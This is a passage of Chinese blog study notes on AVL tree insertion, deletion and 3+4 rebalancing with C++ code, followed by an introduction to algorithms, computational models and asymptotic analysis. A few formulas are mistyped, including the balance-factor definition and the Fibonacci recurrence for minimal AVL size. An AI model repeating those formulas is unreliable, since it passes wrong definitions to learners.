class="comment">//转至初始最左侧通路的末端</span></span><br><span class="line">   <span class="keyword">for</span> ( ; x != p; x = x-&gt;parent ) &#123; <span class="comment">//若x右子树已空，则上升一层</span></span><br><span class="line">       <span class="keyword">while</span> ( x-&gt;rc ) <span class="comment">//否则，反复地</span></span><br><span class="line">       x-&gt;zag(); <span class="comment">//以x为轴做zag旋转</span></span><br><span class="line">      &#125; <span class="comment">//直到抵达子树的根</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>可见，每做一次zag旋转，总有一个节点归入最左侧通路中，后者的长度也同时加一。最坏情况下，除原根节点外，其余节点均各自对应于一次旋转，累计不过n-1次。</p>
<p>由以上结论推广可知：</p>
<p><strong>规模为n的任何两棵等价二叉搜索树，至多经过2n-2次旋转，即可彼此转换。</strong></p>
<h1 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h1><p>通过合理设定适度平衡的标准，并借助以上等价变换，AVL树可实现近似理想的平衡。在渐进意义上，AVL树可始终将其高度控制在$O(logn)$以内，从而保证每次查找、插入或删除操作均可在$O(logn)$时间内完成。</p>
<p>任一节点的平衡因子定义为其左、右子树的高度差，即</p>
<p>$balFac(v)=height(lc(v))=height(rc(v))$</p>
<p>空树高度取-1，单节点子树(叶节点)高度取0。</p>
<p>AVL树，即平衡因子受限的二叉搜索树，其中各节点平衡因子的绝对值均不超过1。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define Balanced(x) ( stature( (x).lc ) &#x3D;&#x3D; stature( (x).rc ) ) &#x2F;&#x2F;理想平衡条件</span><br><span class="line">#define BalFac(x) ( stature( (x).lc ) - stature( (x).rc ) ) &#x2F;&#x2F;平衡因子</span><br><span class="line">#define AvlBalanced(x) ( ( -2 &lt; BalFac(x) ) &amp;&amp; ( BalFac(x) &lt; 2 ) ) &#x2F;&#x2F;AVL平衡条件</span><br></pre></td></tr></table></figure>
<blockquote>
<p>高度为$h$的AVL树至少包含$S(h)=fib(n+3)-1$个节点。</p>
</blockquote>
<p>固定高度$h$，考查节点最少的AVL树</p>
<p>将这一最小规模记作$S(h)$</p>
<p>$S(h)=1+S(h-1)+S(h-2)$<br>$S(h)+1=[S(h-1)+1]+[S(h-2)+1]$</p>
<p>当$h$等于0时，T中至少有1个节点，$S(0)+1=fib(3)$</p>
<p>递推关系为$fib(h+3)=fib(n+2)+fib(n+2)$</p>
<p>反过来，由$n$个节点构成的AVL树，高度至多为$O(logn)$。</p>
<p>按照BST规则动态操作之后，AVL的平衡性可能破坏</p>
<ul>
<li>插入：从祖父开始，每个祖先都有可能失衡，且可能同时失衡</li>
<li>删除：从父亲开始，每个祖先都有可能失衡，但至多一个</li>
</ul>
<p>通过旋转等价变换恢复平衡，累计操作不过$O(logn)$。</p>
<h2 id="节点插入"><a href="#节点插入" class="headerlink" title="节点插入"></a>节点插入</h2><p>插入节点$x$之后，可能有多个失衡节点。插入操作必定位于叶节点处，叶节点的父亲必不失衡，故失衡节点中最低者$g$不低于$x$祖父。</p>
<p>在$x$和$g(x)$的通路上，设$p$为$g(x)$的孩子，$v$为$p$的孩子。$g(x)$是由于$x$的引入而失衡，则$p$和$v$的高度均不会低于各自的兄弟。因此可通过以下宏定义由$g(x)$找到$p$和$v$。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define tallerChild(x) ( \</span><br><span class="line">   stature( (x)-&gt;lc ) &gt; stature( (x)-&gt;rc ) ? (x)-&gt;lc : ( &#x2F;*左高*&#x2F; \</span><br><span class="line">   stature( (x)-&gt;lc ) &lt; stature( (x)-&gt;rc ) ? (x)-&gt;rc : ( &#x2F;*右高*&#x2F; \</span><br><span class="line">   IsLChild( * (x) ) ? (x)-&gt;lc : (x)-&gt;rc &#x2F;*等高：与父亲x同侧者（zIg-zIg或zAg-zAg）优先*&#x2F; \</span><br><span class="line">   ) \</span><br><span class="line">   ) \</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这里通过比较子树的高度直接计算。失衡节点的恢复方案取决于节点$g(x)$、$p$、$v$之间具体的联接方向。</p>
<p><strong>单旋</strong></p>
<p>不妨设$p$是$g$的右孩子，$c$是$p$的右孩子。在这种情况下，必定是子树$v$中插入节点$x$，而使$g(x)$不再平衡。逆时针旋转<code>zag(g(x))</code>，$g(x)$必将恢复平衡。对称情况可由<code>zig(g(x))</code>恢复平衡。</p>
<p><img src="https://i.loli.net/2019/09/05/OgtlCb9r2SEGB3s.png"></p>
<p><strong>双旋</strong></p>
<p>不妨设节点$v$是$p$的左孩子，而$p$是$g(x)$的右孩子。在这种情况下，必定是在子树$v$中插入了新节点$x$，而致使$g(x)$不再平衡。先顺时针旋转<code>zig(p)</code>，再<code>zag(g(x))</code>，$g(x)$必将恢复平衡。</p>
<p><img src="https://i.loli.net/2019/09/05/Er2TLX4YKDyC3hu.png"></p>
<p>经过局部调整后，局部子树高度也必将复原，$g(x$)以上所有祖先的平衡因子亦将统一地复原。在AVL树中插入新节点后，仅需不超过两次旋转即可使整树恢复平衡。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) AVL&lt;T&gt;::insert ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//将关键码e插入AVL树中</span></span><br><span class="line">   BinNodePosi(T) &amp; x = search ( e ); <span class="keyword">if</span> ( x ) <span class="keyword">return</span> x; <span class="comment">//确认目标节点不存在</span></span><br><span class="line">   BinNodePosi(T) xx = x = <span class="keyword">new</span> BinNode&lt;T&gt; ( e, _hot ); _size++; <span class="comment">//创建新节点x</span></span><br><span class="line"><span class="comment">// 此时，x的父亲_hot若增高，则其祖父有可能失衡</span></span><br><span class="line">   <span class="keyword">for</span> ( BinNodePosi(T) g = _hot; g; g = g-&gt;parent ) &#123; <span class="comment">//从x之父出发向上，逐层检查各代祖先g</span></span><br><span class="line">      <span class="keyword">if</span> ( !AvlBalanced ( *g ) ) &#123; <span class="comment">//一旦发现g失衡，则（采用“3 + 4”算法）使之复衡，并将子树</span></span><br><span class="line">         FromParentTo ( *g ) = rotateAt ( tallerChild ( tallerChild ( g ) ) ); <span class="comment">//重新接入原树</span></span><br><span class="line">         <span class="keyword">break</span>; <span class="comment">//g复衡后，局部子树高度必然复原；其祖先亦必如此，故调整随即结束</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">//否则（g依然平衡），只需简单地</span></span><br><span class="line">         updateHeight ( g ); <span class="comment">//更新其高度（注意：即便g未失衡，高度亦可能增加）</span></span><br><span class="line">   &#125; <span class="comment">//至多只需一次调整；若果真做过调整，则全树高度必然复原</span></span><br><span class="line">   <span class="keyword">return</span> xx; <span class="comment">//返回新节点位置</span></span><br><span class="line">&#125; <span class="comment">//无论e是否存在于原树中，总有AVL::insert(e)-&gt;data == e</span></span><br></pre></td></tr></table></figure>
<p>在AVL树中引入一个节点后，失衡的节点可能多达$\Omega(logn)$个。</p>
<h2 id="节点删除"><a href="#节点删除" class="headerlink" title="节点删除"></a>节点删除</h2><p>同时至多一个失衡节点，首个可能就是$x$的父亲$hot$</p>
<p>在不包含$x$的一侧，必有一个非空孩子$p$，且$p$的孩子至少为1。于是，可按以下规则从$p$的两个孩子中选出节点$v$</p>
<ul>
<li>若两个孩子不等高，则$v$取作其中更高者</li>
<li>否则，优先取与$v$与$p$同向者</li>
</ul>
<p><strong>单旋</strong></p>
<p>在$T_{3}$中删除了节点而使$g(x)$不再平衡，但$p$的平衡因子非负时，通过以g(x)为轴顺时针旋转一次可恢复局部的平衡。</p>
<p><img src="https://i.loli.net/2019/09/05/56Jglbcdf1XWQNI.png"></p>
<p><strong>双旋</strong></p>
<p>若$g(x)$失衡时$p$的平衡因子为-1，则经过以$p$为轴的一次逆时针旋转和以$g(x)$为轴顺时针旋转时可恢复局部平衡。</p>
<p><img src="https://i.loli.net/2019/09/05/o7CGOzSfMXla3Ji.png"></p>
<p><strong>失衡传播</strong></p>
<p>在删除节点后，通过单旋或双旋调整使局部子树恢复平衡，但是恢复平衡后，子树的高度未必可以复原，可能再次失衡。</p>
<p>设$g(x)$复衡后，局部子树的高度的确降低。此时，若$g(x)$原本属于某一更高祖先的更短分支，则因为该分支的进一步缩短，从而致使该祖先失衡，称作失衡传播。失衡传播的方向必然为自底而上，而不至于影响到后代节点。在此过程的任一时刻，至多只有一个失衡的节点；高层的某一节点由平衡转为失衡只可能发生在下层失衡节点恢复平衡之后。因此，可沿<code>parent</code>指针遍历所有祖先，每找到一个失衡的祖先节点，即可套用以上算法使之恢复平衡。</p>
<p>在AVL树中摘除一个节点后，刚刚通过调整使$g(x)$恢复了平衡，此时，若发现$g(x)$原先的父节点依然平衡，在更高层仍可能有失衡的祖先，仅仅通过平衡性不足以确定可否终止自底而上的重平衡过程，转而核对重平衡后节点的高度可判断是否可以立即终止上溯过程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> AVL&lt;T&gt;::remove ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//从AVL树中删除关键码e</span></span><br><span class="line">   BinNodePosi(T) &amp; x = search ( e ); <span class="keyword">if</span> ( !x ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//确认目标存在（留意_hot的设置）</span></span><br><span class="line">   removeAt ( x, _hot ); _size--; <span class="comment">//先按BST规则删除之（此后，原节点之父_hot及其祖先均可能失衡）</span></span><br><span class="line">   <span class="keyword">for</span> ( BinNodePosi(T) g = _hot; g; g = g-&gt;parent ) &#123; <span class="comment">//从_hot出发向上，逐层检查各代祖先g</span></span><br><span class="line">      <span class="keyword">if</span> ( !AvlBalanced ( *g ) ) <span class="comment">//一旦发现g失衡，则（采用“3 + 4”算法）使之复衡，并将该子树联至</span></span><br><span class="line">         g = FromParentTo ( *g ) = rotateAt ( tallerChild ( tallerChild ( g ) ) ); <span class="comment">//原父亲</span></span><br><span class="line">      updateHeight ( g ); <span class="comment">//并更新其高度（注意：即便g未失衡，高度亦可能降低）</span></span><br><span class="line">   &#125; <span class="comment">//可能需做Omega(logn)次调整——无论是否做过调整，全树高度均可能降低</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//删除成功</span></span><br><span class="line">&#125; <span class="comment">//若目标节点存在且被删除，返回true；否则返回false</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在AVL树中摘除一个节点后，失衡的节点至多一个</p>
</blockquote>
<p>节点的平衡与否取决于其左、右子树之差。因此反过来，只要子树的高度不变，则节点不可能失衡。</p>
<p>在删除节点以后自底而上逐层核对平衡因子的过程中，一旦遇到一个失衡节点$v$，则被删除的节点必然来自$v$原来更低的一棵子树，而$v$的高度必然由其另一更高的子树确定，故$v$的高度必然保持不变。由此可知，其祖先节点必然不可能失衡。</p>
<blockquote>
<p>在高度为h的AVL树中，任一叶节点的深度均不小于$\lfloor h/2 \rfloor$</p>
</blockquote>
<p>对树高做数学归纳。作为归纳基时，$h=1$的情况显然。假设以上命题对高度小于$h$的AVL树均成立。</p>
<p>根据AVL树的性质，此时左、右子树的高度至多为$h-1$，至少为$h-2$。</p>
<p>由归纳假设，在高度为$h-1$的子树内部，叶节点的深度不小于$\lceil (h-1)/2 \rceil \geq \lceil h/2 \rceil -1$ </p>
<p>而在高度为$h-2$的子树内部，叶节点的深度也不小于$ \lceil h/2 \rceil -1$ </p>
<p>因此在全树中，任何叶节点深度都不至小于</p>
<p>$ 1+(\lceil h/2 \rceil -1)=\lceil h/2 \rceil$ </p>
<p>对于任意大的正整数都存在一棵规模为$n$的AVL树，从中删除某一特定节点后的确需要做$\Omega(logn)$次旋转方能使全树恢复平衡。</p>
<blockquote>
<p>knuth指出，remove()操作尽管在最坏情况下需做$\Omega(logn)$次旋转，但平均而言仅需0.21次</p>
</blockquote>
<p>设在AVL树中摘除一个节点后，刚刚通过调整使g(x)恢复了平衡。此时若发现g(x)原来的父节点恢复了平衡，仍然需要检查更高层的祖先。</p>
<p>仅仅通过平衡性，并不足以确定可否及时终止自底而上的重平衡过程。转而核对重平衡后节点的高度，即可及时判断是否可以立即停止上溯过程。</p>
<p>AVL的插入操作，可以在首次重平衡后随即终止上溯，原因在于此时不仅局部子树的平衡性能够恢复，而且局部子树的高度亦必然同时恢复。</p>
<h2 id="统一重平衡算法"><a href="#统一重平衡算法" class="headerlink" title="统一重平衡算法"></a>统一重平衡算法</h2><p>从刚发生失衡的节点$x$出发逆行而上，直至遇到最低的失衡节点$g(x)$。于是在$g(x)$的更高一侧的子树内，其孩节点$p$和孙节点$v$必然存在，这一局部可以$g(x)$，$p$，$v$为界，分为四棵子树。按照中序遍历序列再重新排序$g(x)$和$p$,$v$，分别命名为$a$,$b$,$c$。观察之前的例子，可以发现四7棵子树的高度彼此相差不过一层，所以将这四棵树重新组装起来恰好即是一棵AVL树。</p>
<p><img src="https://i.loli.net/2019/09/05/iwsFpGeAUv6aLVx.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) BST&lt;T&gt;::connect34 (</span><br><span class="line">   BinNodePosi(T) a, BinNodePosi(T) b, BinNodePosi(T) c,</span><br><span class="line">   BinNodePosi(T) T0, BinNodePosi(T) T1, BinNodePosi(T) T2, BinNodePosi(T) T3</span><br><span class="line">) &#123;</span><br><span class="line">   <span class="comment">//*DSA*/print(a); print(b); print(c); printf(&quot;\n&quot;);</span></span><br><span class="line">   a-&gt;lc = T0; <span class="keyword">if</span> ( T0 ) T0-&gt;parent = a;</span><br><span class="line">   a-&gt;rc = T1; <span class="keyword">if</span> ( T1 ) T1-&gt;parent = a; updateHeight ( a );</span><br><span class="line">   c-&gt;lc = T2; <span class="keyword">if</span> ( T2 ) T2-&gt;parent = c;</span><br><span class="line">   c-&gt;rc = T3; <span class="keyword">if</span> ( T3 ) T3-&gt;parent = c; updateHeight ( c );</span><br><span class="line">   b-&gt;lc = a; a-&gt;parent = b;</span><br><span class="line">   b-&gt;rc = c; c-&gt;parent = b; updateHeight ( b );</span><br><span class="line">   <span class="keyword">return</span> b; <span class="comment">//该子树新的根节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) BST&lt;T&gt;::rotateAt ( BinNodePosi(T) v ) &#123; <span class="comment">//v为非空孙辈节点</span></span><br><span class="line">   <span class="comment">/*DSA*/</span><span class="keyword">if</span> ( !v ) &#123; <span class="built_in">printf</span> ( <span class="string">&quot;\a\nFail to rotate a null node\n&quot;</span> ); <span class="built_in">exit</span> ( <span class="number">-1</span> ); &#125;</span><br><span class="line">   BinNodePosi(T) p = v-&gt;parent; BinNodePosi(T) g = p-&gt;parent; <span class="comment">//视v、p和g相对位置分四种情况</span></span><br><span class="line">   <span class="keyword">if</span> ( IsLChild ( *p ) ) <span class="comment">/* zig */</span></span><br><span class="line">      <span class="keyword">if</span> ( IsLChild ( *v ) ) &#123; <span class="comment">/* zig-zig */</span> </span><br><span class="line">         p-&gt;parent = g-&gt;parent; <span class="comment">//向上联接</span></span><br><span class="line">         <span class="keyword">return</span> connect34 ( v, p, g, v-&gt;lc, v-&gt;rc, p-&gt;rc, g-&gt;rc );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">/* zig-zag */</span>  </span><br><span class="line">         v-&gt;parent = g-&gt;parent; <span class="comment">//向上联接</span></span><br><span class="line">         <span class="keyword">return</span> connect34 ( p, v, g, p-&gt;lc, v-&gt;lc, v-&gt;rc, g-&gt;rc );</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">else</span>  <span class="comment">/* zag */</span></span><br><span class="line">      <span class="keyword">if</span> ( IsRChild ( *v ) ) &#123; <span class="comment">/* zag-zag */</span> </span><br><span class="line">         p-&gt;parent = g-&gt;parent; <span class="comment">//向上联接</span></span><br><span class="line">         <span class="keyword">return</span> connect34 ( g, p, v, g-&gt;lc, p-&gt;lc, v-&gt;lc, v-&gt;rc );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">/* zag-zig */</span>  </span><br><span class="line">         v-&gt;parent = g-&gt;parent; <span class="comment">//向上联接</span></span><br><span class="line">         <span class="keyword">return</span> connect34 ( g, v, p, g-&gt;lc, v-&gt;lc, v-&gt;rc, p-&gt;rc );</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论</title>
    <url>/algorithm/intro/</url>
    <content><![CDATA[<p>算法一词在古籍中最早见于周髀算经，对应的algorithm一词来自于波斯数学家<em>al-Khwarizmi</em> ，均以数学语言描述。最早的算法在线性方程组中用到，其中的欧几里得算法为史上第一个算法。算法一词在日常生活中也越来越普遍，究竟什么才可以称为算法呢？我们又可以怎样衡量算法效率呢？</p>
<a id="more"></a>

<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>算法是计算机程序的数学抽象，基于特定的计算模型，旨在解决某一信息处理问题而设计的指令序列。</p>
<p>算法具有以下特性：</p>
<ul>
<li><code>输入</code>待处理的信息(问题)</li>
<li><code>输出</code> 经处理的信息(答案)</li>
<li><code>正确性</code> 的确可以解决指定的问题</li>
<li><code>确定性</code> 任一算法均可以描述为一个由基本操作组成的序列</li>
<li><code>可行性</code> 每一基本操作都可实现，且在常数时间内完成</li>
<li><code>有穷性</code> 对于任何输入，经有穷次操作，都可以得到输出</li>
</ul>
<p>计算的过程即为信息处理的过程，输入信息经算法处理后得到输出信息。计算模型为计算机的抽象，各层次间抽象对应关系为：</p>
<table>
<thead>
<tr>
<th>程序</th>
<th>算法</th>
</tr>
</thead>
<tbody><tr>
<td>编程语言</td>
<td>伪代码</td>
</tr>
<tr>
<td>计算机</td>
<td>计算模型</td>
</tr>
</tbody></table>
<p>其中，算法建立在伪代码之上，伪代码建立于计算模型之上，类似的，程序基于编程语言，编程语言基于计算机实现。</p>
<h1 id="计算模型"><a href="#计算模型" class="headerlink" title="计算模型"></a>计算模型</h1><p>在实际环境中直接测得的执行时间，可作为衡量算法效率的指标。可是即便是同一输入，同一算法，在不同的硬件平台上、不同的操作系统，所需要的时间都不尽相同。在图灵机、随机存储机等计算模型中，指令语句均可分解为若干次基本操作，比如算术运算、比较、分支、子程序调用和返回等，在大多数实际计算环境中，每一次这类基本操作都可在常数时间内完成。这样一来，可以将时间复杂度理解为算法中各条指令的执行时间之和，从而统一衡量各个算法的效率。</p>
<p>计算模型指定了：</p>
<ol>
<li>算法的基本操作</li>
<li>每种操作的成本(时间，空间)</li>
</ol>
<h2 id="RAM"><a href="#RAM" class="headerlink" title="RAM"></a>RAM</h2><p><img src="https://i.loli.net/2019/08/28/VJTp8wSemy61H7t.png" alt="TIM截图20190828113648.png"></p>
<p>RAM(random access machine)由只读的输入纸带，只写的输出纸带和内存组成。内存由一系列无限宽度的寄存器组成，寄存器按照顺序编号，总数无限制。控制单元存储程序，即一系列语句，由程序计数器来指定下一个执行的语句。</p>
<p>在常数时间内，可以执行以下操作：</p>
<ul>
<li>将值读入到寄存器中</li>
<li>寄存器进行简单的加减乘除运算</li>
<li>将寄存器的值存储到内存中</li>
<li>通过寄存器号访问对应的寄存器</li>
</ul>
<blockquote>
<p>在哪些方面，现代电子计算机仍未达到RAM模型的需求</p>
</blockquote>
<p>现代电子计算机的寄存器数量有限，无法为无限总数，字长有限，无法存储任意宽度的整数。</p>
<h2 id="图灵机"><a href="#图灵机" class="headerlink" title="图灵机"></a>图灵机</h2><p>图灵的基本思想是用机器来模拟人们用纸笔进行数学运算的过程，他把这样的过程看作下列两种简单的动作：</p>
<ul>
<li>在纸上写上或擦除某个符号；</li>
<li>把注意力从纸的一个位置移动到另一个位置；</li>
</ul>
<p>而在每个阶段，人要决定下一步的动作，依赖于</p>
<p>（a）此人当前所关注的纸上某个位置的符号</p>
<p>（b）此人当前思维的状态。</p>
<p>为了模拟人的这种运算过程，图灵构造出一台假想的机器，该机器由以下几个部分组成：</p>
<ol>
<li><p>一条无限长的纸带TAPE。纸带被划分为一个接一个的小格子，每个格子上包含一个来自有限字母表的符号，字母表中有一个特殊的符号表示空白。纸带上的格子从左到右依次被编号为0, 1, 2, …，纸带的右端可以无限伸展。</p>
</li>
<li><p>一个读写头HEAD。该读写头可以在纸带上左右移动，它能读出当前所指的格子上的符号，并能改变当前格子上的符号。</p>
</li>
<li><p>一套控制规则TABLE。它根据当前机器所处的状态以及当前读写头所指的格子上的符号来确定读写头下一步的动作，并改变状态寄存器的值，令机器进入一个新的状态，按照以下顺序告知图灵机命令：</p>
<p>写入（替换）或擦除当前符号；</p>
<p>移动 HEAD， ‘L’向左， ‘R’向右或者’N’不移动；</p>
<p>保持当前状态或者转到另一状态</p>
</li>
<li><p>一个状态寄存器。它用来保存图灵机当前所处的状态。图灵机的所有可能状态的数目是有限的，并且有一个特殊的状态h，称为停机状态。</p>
</li>
</ol>
<p>借助计算模型简化和抽象一般计算工具，使我们可以独立于具体的平台对算法的效率给出可信的评价与评判。</p>
<p>T(n)=算法为求解规模为n的问题所需执行的基本操作次数。</p>
<p>在计算模型中，算法的运行时间正比于算法需要执行的基本操作次数。</p>
<h1 id="渐进分析"><a href="#渐进分析" class="headerlink" title="渐进分析"></a>渐进分析</h1><p>渐进分析符号，也即我们常说的大O记号，以$O、\Theta、 \Omega$ 这三种符号表示。</p>
<p>$f(x)=\Theta(x^2)$ 的形式与函数类似，却不是函数。$f(x)=\Theta(x^2)$意味着$f(x)$的一个上界和一个下界。如图所示，$f(x)$介于$0.9x^2$的下界和$1.2x^2$的上界之间，二者与$O$内的函数仅仅只差了一个常数项。</p>
<p><img src="https://i.loli.net/2019/08/28/sKM9mUPSfDjLruy.png"></p>
<p>$\Theta$从上界和下界同时限制了函数，$O$从上界限制了函数,$\Omega$从下界限制了函数。</p>
<h2 id="常数"><a href="#常数" class="headerlink" title="常数"></a>常数</h2><p>$2019^ {2019}=O(1)$</p>
<p>渐进而言，再大的常数，也小于递增的变数。</p>
<p>这类算法的效率最高，通常不含循环、分支、子程序等，但是具体分析视执行次数而定。</p>
<h2 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h2><p>常底数无所谓，$log_an=log_ablog_bn=\Theta(log_bn)$ </p>
<p>常数次幂无所谓，$log n^c=clogn=\Theta(logn)$</p>
<p>这类算法非常有效，算法复杂度无限接近于常数，</p>
<p>任意$c&gt;0$,$logn=O(n^c)$ </p>
<h2 id="多项式"><a href="#多项式" class="headerlink" title="多项式"></a>多项式</h2><p>取多项式指数最高的一项，即</p>
<p>$a_kn^k+a_{k-1}n^{k-1}+…+a_1n+a_0=O(n^k)$</p>
<p>线性：所有$O(n)$类函数</p>
<h2 id="指数复杂度"><a href="#指数复杂度" class="headerlink" title="指数复杂度"></a>指数复杂度</h2><p>指数：$T(n)=a^n$</p>
<p>此类算法的计算成本增长极快，通常被认为不可忍受，从$n_c$到$2^n$ 是从有效算法到无效算法的分水岭。</p>
<p>随着问题输入规模的增大，同一算法所需的求解时间通常都呈现单调增加的趋势，但可能随着输入规模的增大，同一算法所需的计算时间可能上下波动。</p>
<h1 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h1><p>算法分析有两个主要任务，</p>
<ul>
<li>正确性的证明，即不变性和单调性的证明</li>
<li>复杂度分析，时间复杂度和空间复杂度的分析</li>
</ul>
<p>c++等高级语言的基本指令，均等效于常数条RAM的基本指令，在渐进分析下二者大体相当，所以可通过分析基本指令的执行次数来分析算法效率。</p>
<h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><p>随着输入规模的扩大，算法的执行时间的变化趋势可表现为输入规模的一个函数，称作该算法的时间复杂度。</p>
<p>具体地，特定算法处理规模为$n$的问题所需的时间可记作$T(n)$</p>
<p>复杂度分析主要方法：</p>
<ul>
<li>迭代：将所有基本操作的执行次数累加，即级数求和</li>
<li>递归：递归跟踪，分析递归实例情况，推导递推方程</li>
</ul>
<p>算数级数：与末项平方同阶</p>
<p>幂方级数：比幂次高出一阶</p>
<p>$T(n)=1^2+2^2+…+n^2=O(n^3)$</p>
<p>$T(n)=1^3+2^3+…+n^3=O(n^4)$</p>
<p>几何级数：与末项同阶</p>
<p>$T(n)=a^0+a^1+a^2+a^3+…+a^n=O(a^n)$</p>
<p>收敛级数：</p>
<p>$\sum_{k=1}^{n} \frac{1}{k^2} &lt;1+\frac{1}{2^2}+…=O(1)$</p>
<p>可能未必收敛，但是长度有限：</p>
<p>1)调和级数：$h(n)=1+1/2+1/3+1/4+1/5+…+1/n=\Theta(logn)$</p>
<p>2)对数级数：$log1+log2+log3+log4+…+logn=log(n!)=\Theta(nlogn)$</p>
<h2 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h2><blockquote>
<p>给定n个整数，将它们按照非降序排列</p>
</blockquote>
<p><strong>起泡排序</strong></p>
<p>依次比较每一对相邻元素，若逆序则交换之。若整趟都没有进行交换，则排序完成，否则再进行一趟扫描交换。</p>
<p>不变性：经$k$趟扫描交换后，最大的$k$个元素必然就位</p>
<p>单调性：经$k$趟扫描交换后，问题规模缩减至$n-k$</p>
<p>正确性：经至多$n$趟扫描后，算法必然终止，且能给出正确解答。</p>
<p>其中，单调性通常指问题的有效规模会随着算法的推进不断递减。不变性则不仅应在算法初始状态下自然满足，而且应与最终的正确性相呼应。</p>
<p><strong>性能</strong></p>
<p>最坏情况：输入数据反序排列，共$n-1$趟扫描交换</p>
<p>第$k$趟中，需做$n-k$次比较和$3(n-k)$次移动</p>
<p>累计</p>
<p>移动次数$=3n(n-1)/2$</p>
<p>比较次数$=(n-1)+(n-2)+…+1=n(n-1)/2$</p>
<p>$T(n)=4n(n-1)/2$</p>
<p>最好情况：所有输入元素已经完全有序</p>
<p>外循环仅一次，做$n-1$次比较和$0$次元素交换</p>
<h1 id="迭代与递归"><a href="#迭代与递归" class="headerlink" title="迭代与递归"></a>迭代与递归</h1><blockquote>
<p>计算任意n个整数之和</p>
</blockquote>
<p><strong>线性递归</strong> 逐一取出并累加各个元素</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumI</span> <span class="params">( <span class="keyword">int</span> A[], <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//数组求和算法（迭代版）</span></span><br><span class="line">   <span class="keyword">int</span> sum = <span class="number">0</span>; <span class="comment">//初始化累计器，O(1)</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++ ) <span class="comment">//对全部共O(n)个元素，逐一</span></span><br><span class="line">      sum += A[i]; <span class="comment">//累计，O(1)</span></span><br><span class="line">   <span class="keyword">return</span> sum; <span class="comment">//返回累计值，O(1)</span></span><br><span class="line">&#125; <span class="comment">//O(1) + O(n)*O(1) + O(1) = O(n+2) = O(n)</span></span><br></pre></td></tr></table></figure>
<h2 id="减而治之"><a href="#减而治之" class="headerlink" title="减而治之"></a>减而治之</h2><p>为了求解一个大规模的问题，</p>
<ul>
<li>将其划分为两个子问题，其一平凡，另一规模缩减，</li>
<li>分别求解子问题，</li>
<li>由子问题的解得到原问题的解答。</li>
</ul>
<p>递归跟踪分析：</p>
<p>整个算法所需的计算时间应该等于所有递归实例的创建、执行和销毁所需的时间总和。检查每个递归实例，累计所需时间(调用语句本身计入对应的子实例)，其总和即为算法执行时间。在空间上，递归调用的空间复杂度正比于最大递归深度。</p>
<p><strong>线性递归</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span> <span class="params">( <span class="keyword">int</span> A[], <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//数组求和算法（线性递归版）</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">1</span> &gt; n ) <span class="comment">//平凡情况，递归基</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//直接（非递归式）计算</span></span><br><span class="line">   <span class="keyword">else</span> <span class="comment">//一般情况</span></span><br><span class="line">      <span class="keyword">return</span> sum ( A, n - <span class="number">1</span> ) + A[n - <span class="number">1</span>]; <span class="comment">//递归：前n - 1项之和，再累计第n - 1项</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<p>递归跟踪分析</p>
</blockquote>
<p>每个递归实例只需要常数时间，递归深度为$n+1$</p>
<p>$T(n) = O(1)*(n + 1) = O(n)$</p>
<blockquote>
<p>递推方程分析</p>
</blockquote>
<p>从递推的角度来看，为求解<code>sum(A,n)</code> ,需递归求解规模为$n-1$的问题<code>sum(A,n-1)</code> ,再累加上A[n-1].</p>
<p>递推方程</p>
<p>$T(n)=T(n-1)+O(1)$</p>
<p>$T(0)=O(1)$</p>
<p>$T(n)=O(n)$</p>
<h2 id="分而治之"><a href="#分而治之" class="headerlink" title="分而治之"></a>分而治之</h2><p><strong>二分递归</strong></p>
